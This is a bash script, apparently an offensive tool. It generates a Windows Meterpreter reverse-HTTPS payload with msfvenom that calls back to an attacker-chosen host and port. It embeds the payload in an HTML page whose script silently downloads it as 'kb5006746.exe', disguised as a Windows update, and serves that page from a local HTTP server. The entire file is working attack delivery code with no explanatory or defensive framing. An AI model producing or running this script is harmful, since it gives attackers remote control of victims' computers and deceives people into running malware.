#!/bin/bash

# Prompt the user for the IP address and port
read -p "Enter LHOST IP Address: " ip_address
read -p "Enter LPORT Port Number: " port_number

# Generate the payload using msfvenom
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$ip_address LPORT=$port_number -f exe -o /var/www/html/msfstaged.exe

# Check if msfvenom command was successful
if [ $? -eq 0 ]; then
    echo "Payload created successfully."

    # Convert the generated file to Base64 and remove line breaks
    base64_string=$(base64 -w 0 /var/www/html/msfstaged.exe)

    # Create or update the HTML file with the Base64 string
    cat <<EOF > /var/www/html/download.html
<html>
    <body>
        <script>
          function base64ToArrayBuffer(base64) {
              var binary_string = window.atob(base64);
              var len = binary_string.length;
              var bytes = new Uint8Array(len);
              for (var i = 0; i < len; i++) {
                  bytes[i] = binary_string.charCodeAt(i);
              }
              return bytes.buffer;
          }

          var file ='${base64_string}';
          var data = base64ToArrayBuffer(file);
          var blob = new Blob([data], {type: 'octet/stream'});
          var fileName = 'kb5006746.exe';

          var a = document.createElement('a');
          document.body.appendChild(a);
          a.style = 'display: none';
          var url = window.URL.createObjectURL(blob);
          a.href = url;
          a.download = fileName;
          a.click();
          window.URL.revokeObjectURL(url);
        </script>
    </body>
</html>
EOF

    echo "HTML file created/updated successfully."

    # Change directory to the web server root
    cd /var/www/html

    # Get the server IP address
    server_ip=$(hostname -I | awk '{print $1}')

    # Start the Python HTTP server on port 80
    # Note: Running a server on port 80 usually requires root privileges
    echo "Starting Python HTTP server on port 80..."
    sudo python3 -m http.server 80 &

    # Display the full URL
    echo "Payload is available at: http://${server_ip}/download.html"

else
    echo "Failed to create payload. Please check the error messages above."
fi
